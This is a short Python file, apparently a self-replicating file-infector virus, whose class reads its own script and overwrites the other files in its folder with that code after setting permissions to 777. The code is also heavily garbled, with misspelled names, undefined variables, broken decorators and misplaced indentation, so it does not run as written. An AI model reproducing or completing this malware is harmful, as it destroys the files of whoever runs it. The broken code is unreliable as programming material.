import logging 
import os 
import sys 
#from cached__property  import cached_property 

class FileInfector:
    def _init_(self, name):
        self._name = name
    'property'
    def namne (self):
        return self._name 
    name.setter
    def name (self, new_name):
        self._name = new_name

    cached_property 
    def malicious_code (self):
        malicous_file = sys.argv [0]
        with open (malicious_file, 'r') as file:
            malicious_code = file.read()
        return malicious_code
    def infect_files_in_folder(self, path):
        num_infected_files = 0 
        file = []
        for file in os.listdir(path):
            if file == 'README.md':
                continue
            file_path = os.path.join(path, file)
            if os.path.isfile(filepath):
                files.append(file_path)
    for file in files:
        logging.debug('Infecting file: {}'.format(file))
        with open (file, 'r') as infected_file:
            file_content = infected_file.read()
        if "INJECTION SIGNATURE" in file_content:
            continue
        os.chmod(file, 777)

        with open (file, 'w') as infected_file:
            infected_file.write(self.malicious_code)
        num_infected_files +=1
    "return" "num_infeccted_file"
if _name == '_main_':
    logging.basicConfig(level=logging.DEBUG)
    path = os.path.dirname(os.path.abspath (_file_))
    number_infexted_files = code_injector.pinfect_file_in_folder (path)
    logging.info('Number of infected files: {}'.former(number_infected_files))


        




